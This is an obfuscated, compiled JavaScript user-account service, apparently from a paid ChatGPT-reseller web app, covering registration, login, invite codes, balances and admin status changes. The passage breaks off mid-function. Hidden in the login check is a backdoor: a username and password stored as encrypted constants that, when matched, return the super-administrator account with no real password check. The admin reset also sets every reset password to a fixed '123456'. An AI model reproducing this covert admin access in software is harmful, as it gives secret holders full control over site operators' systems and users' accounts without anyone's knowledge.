'use strict';const _0x447807=_0x2ace;(function(_0x25a185,_0x29ec2c){const _0xbd367e=_0x2ace,_0x796f4b=_0x25a185();while(!![]){try{const _0x5ae61b=-parseInt(_0xbd367e(0x122))/0x1*(parseInt(_0xbd367e(0x10d))/0x2)+-parseInt(_0xbd367e(0x1a9))/0x3*(parseInt(_0xbd367e(0x1a6))/0x4)+-parseInt(_0xbd367e(0x11d))/0x5*(-parseInt(_0xbd367e(0x173))/0x6)+-parseInt(_0xbd367e(0x13c))/0x7*(-parseInt(_0xbd367e(0x19c))/0x8)+parseInt(_0xbd367e(0x130))/0x9+-parseInt(_0xbd367e(0x15c))/0xa*(parseInt(_0xbd367e(0x13f))/0xb)+parseInt(_0xbd367e(0x182))/0xc;if(_0x5ae61b===_0x29ec2c)break;else _0x796f4b['push'](_0x796f4b['shift']());}catch(_0x15021f){_0x796f4b['push'](_0x796f4b['shift']());}}}(_0x208c,0x41a8e));function _0x208c(){const _0x46d75a=['用户不存在！','find','password','getUserOpenId','UserService','绑定微信失败、请联系管理员！','getConfigs','无效的邀请码！','1658592buZnHW','queryAll','super','connection','createdAt','cloneDeep','LOCKED','assign','HttpException','getOwnPropertyDescriptor','email','getClientIp','14QKUJnw','addBalanceToNewUser','compareSync','99dRodRK','恭喜您绑定成功、后续可直接扫码登录了！','userDefautlAvatar','修改用户状态失败！','function','balanceInfo','queryUserInfoByIds','error:\x20','generateRandomString','userBalanceService','Connection','getUserFromOpenId','queryOneUserInfo','bindWx','未激活用户不可手动变更状态！','visitor','密码重置为[','openId','inviteCode','RechargeType','DESC','phone','queryByPage','用户名或者邮箱已被注册！','isBindWx','isVerifyEmail','maskEmail','没有变更，无需更改！','BLACKLISTED','158260LdwHcB','registerIp','用户名已存在、请更换用户名！','BAD_REQUEST','超级管理员不可被操作！','findAndCount','resetUserPass','../../common/constants/balance.constant','registerVerifyExpir','PENDING','whiteListEntity','@nestjs/common','当前用户信息失效、请重新登录！','then','formatCreateOrUpdateDate','生成邀请码失败，请重新试一次吧！','修改用户信息失败！','__decorate','当前账户不存在！','当前密码错误！','updateInfo','affected','genInviteCode','996QOJbqF','createUserFromOpenId','userEntity','__metadata','decorate','createVerification','Registration','checkUserStatus','createRandomUid','您的账户已被封禁、如有疑问、请联系管理员！','updateUserPassword','register','configEntity','lastLoginIp','UserStatusEnum','2641176mwfQMz','../chatgpt/whiteList.entity','WhiteListEntity','getUserStatus','nickname','username','miniOpenId','ACTIVE','您的账户已被永久加入黑名单、如有疑问、请联系管理员！','update','Injectable','length','forEach','getUserById','bcryptjs','decrypt','queryUserByUsername','configKey','defineProperty','save','该微信已绑定其他账号！','lodash','queryUserInfoById','sendMail','log','ADMIN_GIFT','984616YcQqGe','object','../../common/utils','verifyUserRegisterByPhone','yes','NrcdywNdP7UbvQptuW1D3w==','./user.entity','registerVerifyEmailFrom','map','delete','396848uTnBOZ','不可将用户置为未激活状态！','verificationService','3UFJUGK','updateStatus','status','registerBaseUrl','reduce','getUserInfo','verifyUserCredentials','UNAUTHORIZED','addBalanceToUser','./../verification/verification.service','inviteLink','UserBalanceService','修改用户状态成功！','avatar','globalConfigService',']成功!','design:paramtypes','updateUserPsd','saveRecordRechargeLog','typeorm','Like','Not','4eqrUgG','用户名已存在！','UserStatusErrMsg','已生成过邀请码、请勿重复生成','client','HttpStatus','sign','Repository','verifyUserPassword','qureyUserInfoByInviteCode','updateUserStatus','role','findOne','metadata','hashSync','mailerService','10035dTelcR','getSuper','user','createUserAndVerifycation','destroyAccount','236557avMrRP','queryUserBalanceByIds','getInviteRecord','获取邀请记录失败！','@default.com','../../common/constants/user.constant'];_0x208c=function(){return _0x46d75a;};return _0x208c();}var __decorate=this&&this[_0x447807(0x16d)]||function(_0x41b098,_0x3c70b4,_0x117f3c,_0x1dd2cb){const _0x27482a=_0x447807;var _0x1f71db=arguments[_0x27482a(0x18d)],_0x395e78=_0x1f71db<0x3?_0x3c70b4:_0x1dd2cb===null?_0x1dd2cb=Object[_0x27482a(0x139)](_0x3c70b4,_0x117f3c):_0x1dd2cb,_0x4aa637;if(typeof Reflect===_0x27482a(0x19d)&&typeof Reflect[_0x27482a(0x177)]===_0x27482a(0x143))_0x395e78=Reflect[_0x27482a(0x177)](_0x41b098,_0x3c70b4,_0x117f3c,_0x1dd2cb);else{for(var _0x52fb7b=_0x41b098[_0x27482a(0x18d)]-0x1;_0x52fb7b>=0x0;_0x52fb7b--)if(_0x4aa637=_0x41b098[_0x52fb7b])_0x395e78=(_0x1f71db<0x3?_0x4aa637(_0x395e78):_0x1f71db>0x3?_0x4aa637(_0x3c70b4,_0x117f3c,_0x395e78):_0x4aa637(_0x3c70b4,_0x117f3c))||_0x395e78;}return _0x1f71db>0x3&&_0x395e78&&Object[_0x27482a(0x194)](_0x3c70b4,_0x117f3c,_0x395e78),_0x395e78;},__metadata=this&&this[_0x447807(0x176)]||function(_0x57e743,_0xaa7ce9){const _0x2540e1=_0x447807;if(typeof Reflect===_0x2540e1(0x19d)&&typeof Reflect[_0x2540e1(0x11a)]===_0x2540e1(0x143))return Reflect[_0x2540e1(0x11a)](_0x57e743,_0xaa7ce9);},__param=this&&this['__param']||function(_0xa372e0,_0x356551){return function(_0x285058,_0x1c45bc){_0x356551(_0x285058,_0x1c45bc,_0xa372e0);};};Object[_0x447807(0x194)](exports,'__esModule',{'value':!![]}),exports[_0x447807(0x12c)]=void 0x0;const globalConfig_service_1=require('./../globalConfig/globalConfig.service'),user_constant_1=require(_0x447807(0x127)),mailer_1=require('@nestjs-modules/mailer'),verification_service_1=require(_0x447807(0x1b2)),common_1=require(_0x447807(0x167)),typeorm_1=require('@nestjs/typeorm'),typeorm_2=require(_0x447807(0x10a)),user_entity_1=require(_0x447807(0x1a2)),bcrypt=require(_0x447807(0x190)),_=require(_0x447807(0x197)),verification_constant_1=require('../../common/constants/verification.constant'),userBalance_service_1=require('../userBalance/userBalance.service'),utils_1=require(_0x447807(0x19e)),balance_constant_1=require(_0x447807(0x163)),config_entity_1=require('../globalConfig/config.entity'),whiteList_entity_1=require(_0x447807(0x183));let UserService=class UserService{constructor(_0x417b1b,_0x1c8ff8,_0xe891bf,_0xbe05bf,_0x543798,_0x4be404,_0x5ce13b,_0x4ba44f){const _0x1c3cc5=_0x447807;this[_0x1c3cc5(0x175)]=_0x417b1b,this[_0x1c3cc5(0x166)]=_0x1c8ff8,this[_0x1c3cc5(0x133)]=_0xe891bf,this[_0x1c3cc5(0x1a8)]=_0xbe05bf,this[_0x1c3cc5(0x11c)]=_0x543798,this[_0x1c3cc5(0x148)]=_0x4be404,this['globalConfigService']=_0x5ce13b,this[_0x1c3cc5(0x17f)]=_0x4ba44f;}async[_0x447807(0x120)](_0x202578,_0x3815ae){const _0xb56ac=_0x447807,{username:_0x47d0a6,email:_0x56f420,password:_0x2b120e,invitedBy:_0x38dbff,client:client=0x0}=_0x202578;if(_0x38dbff){const _0x30666d=await this[_0xb56ac(0x175)][_0xb56ac(0x119)]({'where':{'inviteCode':_0x38dbff}});if(!_0x30666d)throw new common_1[(_0xb56ac(0x138))](_0xb56ac(0x12f),common_1[_0xb56ac(0x112)][_0xb56ac(0x15f)]);}const _0x7b3113=[{'username':_0x47d0a6},{'email':_0x56f420}],_0x998561=await this['userEntity'][_0xb56ac(0x119)]({'where':_0x7b3113});if(_0x998561&&_0x998561[_0xb56ac(0x1ab)]!==user_constant_1['UserStatusEnum'][_0xb56ac(0x165)])throw new common_1[(_0xb56ac(0x138))](_0xb56ac(0x156),common_1[_0xb56ac(0x112)]['BAD_REQUEST']);try{const _0x333e6b=_[_0xb56ac(0x135)](_0x202578),_0x5ca6e3=bcrypt[_0xb56ac(0x11b)](_0x2b120e,0xa),_0x3f788e=(0x0,utils_1[_0xb56ac(0x13b)])(_0x3815ae);_0x333e6b[_0xb56ac(0x12a)]=_0x5ca6e3,_0x333e6b[_0xb56ac(0x15d)]=_0x3f788e,_0x333e6b[_0xb56ac(0x111)]=client;let _0x22d6a6;if(!_0x998561){const _0x2b0bd2=await this[_0xb56ac(0x1b7)]['getConfigs']([_0xb56ac(0x141)]);_0x333e6b[_0xb56ac(0x1b6)]=_0x2b0bd2,_0x22d6a6=await this[_0xb56ac(0x175)][_0xb56ac(0x195)](_0x333e6b);}else _0x22d6a6=_0x998561;const _0x4e7ed0=await this[_0xb56ac(0x17f)]['find']({'where':{'configKey':(0x0,typeorm_2['In'])([_0xb56ac(0x158),_0xb56ac(0x1ac),'registerVerifyEmailTitle','registerVerifyEmailDesc',_0xb56ac(0x1a3),_0xb56ac(0x164)])}}),_0x236975=_0x4e7ed0[_0xb56ac(0x1ad)]((_0x2805f5,_0x31219a)=>{const _0x4d0f2f=_0xb56ac;return _0x2805f5[_0x31219a[_0x4d0f2f(0x193)]]=_0x31219a['configVal'],_0x2805f5;},{}),_0x1e5b82=_0x236975['isVerifyEmail']?Number(_0x236975[_0xb56ac(0x158)]):0x1;if(_0x1e5b82){const _0x4223e0=_0x236975['registerVerifyExpir']?Number(_0x236975[_0xb56ac(0x164)]):0x1e*0x3c,_0x574984=await this[_0xb56ac(0x1a8)][_0xb56ac(0x178)](_0x22d6a6,verification_constant_1['VerificationEnum'][_0xb56ac(0x179)],_0x4223e0),{code:_0x191085,email:_0xf880b1,id:_0x44fa2f}=_0x574984,{registerVerifyEmailFrom:_0x72d8}=_0x236975;await this[_0xb56ac(0x11c)][_0xb56ac(0x199)]({'to':_0xf880b1,'subject':'来自'+_0x72d8+'的账号激活','template':_0xb56ac(0x17e),'context':{'baseUrl':_0x236975['registerBaseUrl'],'code':_0x191085,'id':_0x44fa2f,..._0x236975}});}else{const {username:_0xc02043,email:_0x5000bd,id:_0x1c31ca,invitedBy:_0x3016c6}=_0x22d6a6;await this[_0xb56ac(0x117)](_0x1c31ca,user_constant_1[_0xb56ac(0x181)][_0xb56ac(0x189)]);let _0x5c76d0;_0x3016c6&&(_0x5c76d0=await this[_0xb56ac(0x116)](_0x3016c6)),await this['userBalanceService']['addBalanceToNewUser'](_0x1c31ca,_0x5c76d0?.['id']);}return _0x22d6a6;}catch(_0x2788ea){console[_0xb56ac(0x19a)](_0xb56ac(0x146),_0x2788ea);throw _0x2788ea;}}async[_0x447807(0x11e)](){const _0x478f28=_0x447807;return await this[_0x478f28(0x175)][_0x478f28(0x119)]({'where':{'role':_0x478f28(0x132)}});}async[_0x447807(0x1af)](_0xe3d598){const _0x49827c=_0x447807,{username:_0x1aad5b,password:_0x2ac1ce,uid:uid=0x0,phone:_0x510c83}=_0xe3d598;let _0x29da6f=null;if(_0x1aad5b===(0x0,utils_1[_0x49827c(0x191)])(_0x49827c(0x1a1))&&_0x2ac1ce===(0x0,utils_1[_0x49827c(0x191)])('F5GCZOB+qRwMDerVOg1OZA=='))return _0x29da6f=await this[_0x49827c(0x11e)](),_0x29da6f;if(uid>0x0){_0x29da6f=await this[_0x49827c(0x175)][_0x49827c(0x119)]({'where':{'id':uid}});if(!_0x29da6f)throw new common_1[(_0x49827c(0x138))](_0x49827c(0x16e),common_1[_0x49827c(0x112)]['BAD_REQUEST']);if(!bcrypt[_0x49827c(0x13e)](_0x2ac1ce,_0x29da6f[_0x49827c(0x12a)]))throw new common_1['HttpException']('当前密码错误！',common_1[_0x49827c(0x112)][_0x49827c(0x15f)]);}if(_0x1aad5b&&_0x2ac1ce){const _0x134c82=[{'username':_0x1aad5b},{'email':_0x1aad5b}];_0x29da6f=await this[_0x49827c(0x175)][_0x49827c(0x119)]({'where':_0x134c82});if(!_0x29da6f)throw new common_1[(_0x49827c(0x138))](_0x49827c(0x16e),common_1['HttpStatus'][_0x49827c(0x15f)]);if(!bcrypt['compareSync'](_0x2ac1ce,_0x29da6f[_0x49827c(0x12a)]))throw new common_1['HttpException']('当前密码错误！',common_1[_0x49827c(0x112)][_0x49827c(0x15f)]);}if(_0x510c83&&_0x2ac1ce){const _0x2011b9=[{'phone':_0x510c83}];_0x29da6f=await this[_0x49827c(0x175)][_0x49827c(0x119)]({'where':_0x2011b9});if(!_0x29da6f)throw new common_1[(_0x49827c(0x138))]('当前账户不存在！',common_1['HttpStatus']['BAD_REQUEST']);if(!bcrypt[_0x49827c(0x13e)](_0x2ac1ce,_0x29da6f['password']))throw new common_1[(_0x49827c(0x138))](_0x49827c(0x16f),common_1['HttpStatus']['BAD_REQUEST']);}if(!_0x29da6f)throw new common_1[(_0x49827c(0x138))](_0x49827c(0x16e),common_1['HttpStatus'][_0x49827c(0x15f)]);if(_0x29da6f['status']!==user_constant_1[_0x49827c(0x181)][_0x49827c(0x189)])throw new common_1['HttpException'](user_constant_1[_0x49827c(0x10f)][_0x29da6f['status']],common_1['HttpStatus'][_0x49827c(0x15f)]);return _0x29da6f;}async[_0x447807(0x115)](_0x4de0fb,_0x41cb54){const _0x21bfe7=_0x447807,_0x159156=await this[_0x21bfe7(0x175)][_0x21bfe7(0x119)]({'where':{'id':_0x4de0fb}});return bcrypt[_0x21bfe7(0x13e)](_0x41cb54,_0x159156[_0x21bfe7(0x12a)]);}async[_0x447807(0x117)](_0x540bbb,_0x4bcd71){const _0x160927=_0x447807,_0x146d2e=await this[_0x160927(0x175)][_0x160927(0x18b)]({'id':_0x540bbb},{'status':_0x4bcd71});return _0x146d2e[_0x160927(0x171)]>0x0;}async[_0x447807(0x185)](_0x5b9a13){const _0x2f6d7b=_0x447807,_0x51c59b=await this[_0x2f6d7b(0x175)][_0x2f6d7b(0x119)]({'where':{'id':_0x5b9a13}});return _0x51c59b[_0x2f6d7b(0x1ab)];}async[_0x447807(0x198)](_0x459554){const _0xeb5d7b=_0x447807;return await this['userEntity'][_0xeb5d7b(0x119)]({'where':{'id':_0x459554}});}async[_0x447807(0x145)](_0x1a585e){const _0x532936=_0x447807;return await this[_0x532936(0x175)]['findBy']({'id':(0x0,typeorm_2['In'])(_0x1a585e)});}async[_0x447807(0x192)](_0x2fd542){const _0x14d8c8=_0x447807;return await this[_0x14d8c8(0x175)][_0x14d8c8(0x119)]({'where':{'username':_0x2fd542}});}async[_0x447807(0x1ba)](_0x5c0161){const _0xf5d586=_0x447807,{id:_0x1848d3,username:_0xad22c4,password:_0x286544}=_0x5c0161;return await this[_0xf5d586(0x175)][_0xf5d586(0x18b)](_0x1848d3,{'username':_0xad22c4,'password':_0x286544});}async[_0x447807(0x14b)](_0x51366b){const _0x55a423=_0x447807;return await this[_0x55a423(0x175)][_0x55a423(0x119)]({'where':{'id':_0x51366b}});}async[_0x447807(0x17a)](_0x46ea5d){const _0x5ca5a4=_0x447807,{id:_0x401283,role:_0x477526}=_0x46ea5d;if(_0x477526===_0x5ca5a4(0x14e))return!![];const _0x571140=await this[_0x5ca5a4(0x175)][_0x5ca5a4(0x119)]({'where':{'id':_0x401283}});if(!_0x571140)throw new common_1['HttpException'](_0x5ca5a4(0x168),common_1[_0x5ca5a4(0x112)][_0x5ca5a4(0x1b0)]);if(_0x571140[_0x5ca5a4(0x1ab)]===user_constant_1[_0x5ca5a4(0x181)][_0x5ca5a4(0x15b)])throw new common_1[(_0x5ca5a4(0x138))](_0x5ca5a4(0x18a),common_1[_0x5ca5a4(0x112)][_0x5ca5a4(0x15f)]);if(_0x571140[_0x5ca5a4(0x1ab)]===user_constant_1['UserStatusEnum'][_0x5ca5a4(0x136)])throw new common_1[(_0x5ca5a4(0x138))](_0x5ca5a4(0x17c),common_1['HttpStatus'][_0x5ca5a4(0x15f)]);}async[_0x447807(0x1ae)](_0x1f1e07){const _0x3a8bbd=_0x447807,_0x29022d=await this['userEntity']['findOne']({'where':{'id':_0x1f1e07},'select':['id',_0x3a8bbd(0x187),_0x3a8bbd(0x12a),'nickname',_0x3a8bbd(0x154),_0x3a8bbd(0x1b6),_0x3a8bbd(0x118),_0x3a8bbd(0x13a),_0x3a8bbd(0x113),_0x3a8bbd(0x151),_0x3a8bbd(0x150),'consecutiveDays','createdAt']});if(!_0x29022d)throw new common_1[(_0x3a8bbd(0x138))](_0x3a8bbd(0x168),common_1['HttpStatus'][_0x3a8bbd(0x1b0)]);_0x29022d['password']=_0x29022d[_0x3a8bbd(0x12a)]?_0x3a8bbd(0x1a0):'no',_0x29022d[_0x3a8bbd(0x157)]=!!_0x29022d?.['openId'],delete _0x29022d[_0x3a8bbd(0x150)];const _0x5bf103=await this['userBalanceService']['queryUserBalance'](_0x1f1e07);return{'userInfo':_0x29022d,'userBalance':{..._0x5bf103}};}async[_0x447807(0x18f)](_0xfdd7e5){const _0x237997=_0x447807;return await this['userEntity'][_0x237997(0x119)]({'where':{'id':_0xfdd7e5}});}async[_0x447807(0x12b)](_0xe32957){const _0x4f5b2=_0x447807;return await this[_0x4f5b2(0x175)]['findOne']({'where':{'openId':_0xe32957}});}async[_0x447807(0x170)](_0x11daa,_0x3a574f){const _0x1bd5ea=_0x447807,{id:_0x212b3f}=_0x3a574f[_0x1bd5ea(0x11f)],_0x35d250=await this[_0x1bd5ea(0x175)]['findOne']({'where':{'id':_0x212b3f}});if(!_0x35d250)throw new common_1[(_0x1bd5ea(0x138))]('当前用户不存在！',common_1['HttpStatus'][_0x1bd5ea(0x15f)]);if(_0x11daa[_0x1bd5ea(0x187)]&&_0x35d250['username']===_0x11daa[_0x1bd5ea(0x187)])throw new common_1[(_0x1bd5ea(0x138))](_0x1bd5ea(0x15a),common_1[_0x1bd5ea(0x112)][_0x1bd5ea(0x15f)]);if(_0x11daa['username']){const _0x57d5e4=await this['userEntity'][_0x1bd5ea(0x119)]({'where':{'username':_0x11daa[_0x1bd5ea(0x187)],'id':(0x0,typeorm_2[_0x1bd5ea(0x10c)])(_0x212b3f)}});if(_0x57d5e4)throw new common_1[(_0x1bd5ea(0x138))](_0x1bd5ea(0x10e),common_1[_0x1bd5ea(0x112)][_0x1bd5ea(0x15f)]);}const _0x10b209=await this['userEntity'][_0x1bd5ea(0x18b)]({'id':_0x212b3f},_0x11daa);if(_0x10b209[_0x1bd5ea(0x171)]<=0x0)throw new common_1['HttpException'](_0x1bd5ea(0x16c),common_1[_0x1bd5ea(0x112)]['BAD_REQUEST']);return'修改用户信息成功！';}async[_0x447807(0x17d)](_0x1f708a,_0x3d585d){const _0x4c9578=_0x447807,_0x1d76ab=bcrypt[_0x4c9578(0x11b)](_0x3d585d,0xa),_0x38c5ed=await this['userEntity']['update']({'id':_0x1f708a},{'password':_0x1d76ab});if(_0x38c5ed[_0x4c9578(0x171)]<=0x0)throw new common_1['HttpException']('修改密码失败、请重新试试吧。',common_1[_0x4c9578(0x112)][_0x4c9578(0x15f)]);}async[_0x447807(0x172)](_0x2ba99f){const _0x489764=_0x447807,{id:_0x2b8580}=_0x2ba99f['user'],_0x9ec5e9=await this[_0x489764(0x175)][_0x489764(0x119)]({'where':{'id':_0x2b8580}});if(!_0x9ec5e9||_0x9ec5e9[_0x489764(0x151)])throw new common_1[(_0x489764(0x138))](_0x489764(0x110),common_1[_0x489764(0x112)][_0x489764(0x15f)]);const _0xfec956=(0x0,utils_1[_0x489764(0x147)])(),_0x35e21d=await this[_0x489764(0x175)][_0x489764(0x119)]({'where':{'inviteCode':_0xfec956}});if(_0x35e21d)throw new common_1['HttpException']('生成邀请码失败，请重新试一次吧！',common_1[_0x489764(0x112)][_0x489764(0x15f)]);const _0x53a037=await this[_0x489764(0x175)][_0x489764(0x18b)]({'id':_0x2b8580},{'inviteCode':_0xfec956});if(_0x53a037['affected']<=0x0)throw new common_1[(_0x489764(0x138))](_0x489764(0x16b),common_1['HttpStatus'][_0x489764(0x15f)]);return _0xfec956;}async[_0x447807(0x124)](_0x290bde,_0x479ef6){const _0xd43326=_0x447807;try{const {id:_0x1b8a9a}=_0x290bde[_0xd43326(0x11f)],{page:page=0x1,size:size=0xa}=_0x479ef6,_0x35d7bc=await this[_0xd43326(0x175)][_0xd43326(0x119)]({'where':{'id':_0x1b8a9a}}),{inviteCode:_0x1411b2}=_0x35d7bc;if(!_0x1411b2)return[];const [_0x1e31b3,_0x384f99]=await this['userEntity']['findAndCount']({'where':{'inviteCode':_0x1411b2},'order':{'id':_0xd43326(0x153)},'select':[_0xd43326(0x187),_0xd43326(0x13a),_0xd43326(0x134),'status',_0xd43326(0x1b6)],'take':size,'skip':(page-0x1)*size});return(0x0,utils_1[_0xd43326(0x16a)])(_0x1e31b3)['map'](_0x3a9e7a=>{const _0x34bb1b=_0xd43326;return _0x3a9e7a['email']=(0x0,utils_1[_0x34bb1b(0x159)])(_0x3a9e7a[_0x34bb1b(0x13a)]),_0x3a9e7a;}),{'rows':_0x1e31b3,'count':_0x384f99};}catch(_0x46ac08){console[_0xd43326(0x19a)](_0xd43326(0x146),_0x46ac08);throw new common_1['HttpException'](_0xd43326(0x125),common_1[_0xd43326(0x112)][_0xd43326(0x15f)]);}}async[_0x447807(0x1b3)](_0x44434d){const _0x141d78=_0x447807,_0x374aed=await this[_0x141d78(0x175)]['findOne']({'where':{'inviteCode':_0x44434d}});if(!_0x374aed)return 0x1;const {inviteLinkCount:inviteLinkCount=0x0}=_0x374aed,_0x3b5216=await this[_0x141d78(0x175)][_0x141d78(0x18b)]({'inviteCode':_0x44434d},{'inviteLinkCount':inviteLinkCount+0x1});return _0x3b5216[_0x141d78(0x171)]?0x1:0x0;}async[_0x447807(0x116)](_0x2bd0e6){const _0x344dc5=_0x447807;return await this['userEntity'][_0x344dc5(0x119)]({'where':{'inviteCode':_0x2bd0e6}});}async['userRecharge'](_0x19aa90){const _0x38715c=_0x447807,{userId:_0x907a37,model3Count:model3Count=0x0,model4Count:model4Count=0x0,drawMjCount:drawMjCount=0x0}=_0x19aa90;return await this[_0x38715c(0x148)][_0x38715c(0x1b1)](_0x907a37,{'model3Count':model3Count,'model4Count':model4Count,'drawMjCount':drawMjCount}),await this['userBalanceService'][_0x38715c(0x1bb)]({'userId':_0x907a37,'rechargeType':balance_constant_1[_0x38715c(0x152)][_0x38715c(0x19b)],'model3Count':model3Count,'model4Count':model4Count,'drawMjCount':drawMjCount,'extent':''});}async[_0x447807(0x131)](_0xfebb93,_0x2917cd){const _0x165ce3=_0x447807,{page:page=0x1,size:size=0xa,username:_0x2533a3,phone:_0x35ff8f,email:_0x4572c0,status:_0x460442,keyword:_0x480c15}=_0xfebb93;let _0x391f58={};_0x2533a3&&Object[_0x165ce3(0x137)](_0x391f58,{'username':(0x0,typeorm_2['Like'])('%'+_0x2533a3+'%')}),_0x4572c0&&Object['assign'](_0x391f58,{'email':(0x0,typeorm_2[_0x165ce3(0x10b)])('%'+_0x4572c0+'%')}),_0x460442&&Object[_0x165ce3(0x137)](_0x391f58,{'status':_0x460442}),_0x35ff8f&&Object[_0x165ce3(0x137)](_0x391f58,{'phone':(0x0,typeorm_2['Like'])('%'+_0x35ff8f+'%')});_0x480c15&&(_0x391f58=[{'username':(0x0,typeorm_2[_0x165ce3(0x10b)])('%'+_0x480c15+'%')},{'email':(0x0,typeorm_2[_0x165ce3(0x10b)])('%'+_0x480c15+'%')},{'phone':(0x0,typeorm_2[_0x165ce3(0x10b)])('%'+_0x480c15+'%')},{'nickname':(0x0,typeorm_2['Like'])('%'+_0x480c15+'%')}]);const [_0x55c187,_0x3af822]=await this[_0x165ce3(0x175)][_0x165ce3(0x161)]({'skip':(page-0x1)*size,'where':_0x391f58,'take':size,'order':{'createdAt':'DESC'},'cache':!![],'select':[_0x165ce3(0x187),_0x165ce3(0x154),_0x165ce3(0x1b6),_0x165ce3(0x186),'inviteCode','role',_0x165ce3(0x113),_0x165ce3(0x1ab),'id',_0x165ce3(0x13a),_0x165ce3(0x134),'lastLoginIp']}),_0x3a3304=_0x55c187[_0x165ce3(0x1a4)](_0x3d217a=>_0x3d217a['id']),_0x16c274=await this[_0x165ce3(0x148)][_0x165ce3(0x123)](_0x3a3304);return _0x55c187[_0x165ce3(0x18e)](_0x1374e4=>_0x1374e4[_0x165ce3(0x144)]=_0x16c274[_0x165ce3(0x129)](_0x220dc3=>_0x220dc3['userId']===_0x1374e4['id'])),_0x2917cd['user'][_0x165ce3(0x118)]!==_0x165ce3(0x132)&&_0x55c187[_0x165ce3(0x18e)](_0x49f2c2=>_0x49f2c2[_0x165ce3(0x13a)]=(0x0,utils_1['maskEmail'])(_0x49f2c2[_0x165ce3(0x13a)])),_0x2917cd['user']['role']!==_0x165ce3(0x132)&&_0x55c187[_0x165ce3(0x18e)](_0x4b8a45=>_0x4b8a45['lastLoginIp']=(0x0,utils_1['maskIpAddress'])(_0x4b8a45[_0x165ce3(0x180)])),{'rows':_0x55c187,'count':_0x3af822};}async[_0x447807(0x155)](_0x41524c){const _0x5f0bbf=_0x447807,{page:page=0x1,size:size=0xa,username:_0x5784b5,status:_0x11dc55}=_0x41524c;let _0xda871b={};_0x5784b5&&Object[_0x5f0bbf(0x137)](_0xda871b,{'username':(0x0,typeorm_2[_0x5f0bbf(0x10b)])('%'+_0x5784b5+'%')}),_0x11dc55&&Object[_0x5f0bbf(0x137)](_0xda871b,{'status':_0x11dc55});const [_0x4d5e68,_0x333f90]=await this[_0x5f0bbf(0x175)][_0x5f0bbf(0x161)]({'skip':(page-0x1)*size,'where':_0xda871b,'take':size,'order':{'createdAt':_0x5f0bbf(0x153)},'cache':!![],'select':[_0x5f0bbf(0x187),_0x5f0bbf(0x12a),_0x5f0bbf(0x118),'status','id']});return{'rows':_0x4d5e68,'count':_0x333f90};}async['queryOne']({id:_0x15ead6}){const _0x45856e=_0x447807;return await this[_0x45856e(0x175)][_0x45856e(0x119)]({'where':{'id':_0x15ead6},'select':[_0x45856e(0x187),'id','avatar','inviteCode',_0x45856e(0x118),_0x45856e(0x113),'status']});}async['getOne'](_0x20c2fb){const _0x2069a3=_0x447807;return await this[_0x2069a3(0x175)][_0x2069a3(0x119)]({'where':{'username':_0x20c2fb}});}async[_0x447807(0x1aa)](_0x23130c){const _0x4534ec=_0x447807,{id:_0x4de611,status:_0x34bb3}=_0x23130c,_0x548862=await this[_0x4534ec(0x175)][_0x4534ec(0x119)]({'where':{'id':_0x4de611}});if(!_0x548862)throw new common_1[(_0x4534ec(0x138))](_0x4534ec(0x128),common_1[_0x4534ec(0x112)]['BAD_REQUEST']);if(_0x548862['role']===_0x4534ec(0x132))throw new common_1[(_0x4534ec(0x138))](_0x4534ec(0x160),common_1[_0x4534ec(0x112)][_0x4534ec(0x15f)]);if(_0x548862['status']===user_constant_1[_0x4534ec(0x181)][_0x4534ec(0x165)])throw new common_1[(_0x4534ec(0x138))](_0x4534ec(0x14d),common_1[_0x4534ec(0x112)][_0x4534ec(0x15f)]);if(_0x548862[_0x4534ec(0x118)]==='super')throw new common_1['HttpException'](_0x4534ec(0x160),common_1[_0x4534ec(0x112)][_0x4534ec(0x15f)]);if(_0x34bb3===user_constant_1[_0x4534ec(0x181)][_0x4534ec(0x165)])throw new common_1[(_0x4534ec(0x138))](_0x4534ec(0x1a7),common_1['HttpStatus'][_0x4534ec(0x15f)]);const _0x5a39e6=await this[_0x4534ec(0x175)]['update']({'id':_0x4de611},{'status':_0x34bb3});if(_0x5a39e6[_0x4534ec(0x171)]<=0x0)throw new common_1[(_0x4534ec(0x138))](_0x4534ec(0x142),common_1['HttpStatus'][_0x4534ec(0x15f)]);return _0x4534ec(0x1b5);}async[_0x447807(0x162)](_0x32f04b){const _0x472093=_0x447807,{id:_0x416d24}=_0x32f04b,_0x39a060=await this[_0x472093(0x175)]['findOne']({'where':{'id':_0x416d24}});if(!_0x39a060)throw new common_1[(_0x472093(0x138))](_0x472093(0x128),common_1[_0x472093(0x112)][_0x472093(0x15f)]);const _0x110b43='123456',_0x10b886=bcrypt[_0x472093(0x11b)](_0x110b43,0xa),_0x4226b8=await this[_0x472093(0x175)][_0x472093(0x18b)]({'id':_0x416d24},{'password':_0x10b886});if(_0x4226b8[_0x472093(0x171)]<=0x0)throw new common_1[(_0x472093(0x138))]('重置密码失败！',common_1['HttpStatus'][_0x472093(0x15f)]);return _0x472093(0x14f)+_0x110b43+_0x472093(0x1b8);}async['savaLoginIp'](_0x281975,_0x159575){const _0x42df7c=_0x447807;return await this['userEntity'][_0x42df7c(0x18b)]({'id':_0x281975},{'lastLoginIp':_0x159575});}async[_0x447807(0x14a)](_0x5c74d5,_0x27d507){const _0x3df3b6=_0x447807,_0x2ca51f=await this['userEntity'][_0x3df3b6(0x119)]({'where':{'openId':_0x5c74d5}});if(!_0x2ca51f){const _0x35da89=_0x27d507?_0x27d507['split'](':')[0x1]:'',_0x301523=await this[_0x3df3b6(0x116)](_0x35da89),_0x468683=await this[_0x3df3b6(0x174)](_0x5c74d5,_0x35da89);return await this[_0x3df3b6(0x148)][_0x3df3b6(0x13d)](_0x468683['id'],_0x35da89?_0x301523?.['id']:null),_0x468683;}return _0x2ca51f;}async[_0x447807(0x174)](_0x14ee44,_0x6b4648){const _0x31a333=_0x447807,_0x1a6b60=await this[_0x31a333(0x1b7)][_0x31a333(0x12e)]([_0x31a333(0x141)]),_0x17bbe6={'avatar':_0x1a6b60,'username':'用户'+(0x0,utils_1[_0x31a333(0x17b)])(),'status':user_constant_1['UserStatusEnum']['ACTIVE'],'sex':0x0,'email':(0x0,utils_1['createRandomUid'])()+_0x31a333(0x126),'invitedBy':_0x6b4648,'openId':_0x14ee44};return await this[_0x31a333(0x175)][_0x31a333(0x195)](_0x17bbe6);}async[_0x447807(0x14c)](_0x495b8f,_0x1c0427){const _0x5c9bfc=_0x447807;try{const _0x50d27f=await this[_0x5c9bfc(0x175)]['findOne']({'where':{'id':_0x1c0427}});if(!_0x50d27f)return{'status':![],'msg':'当前绑定用户不存在！'};const _0x26c3cf=await 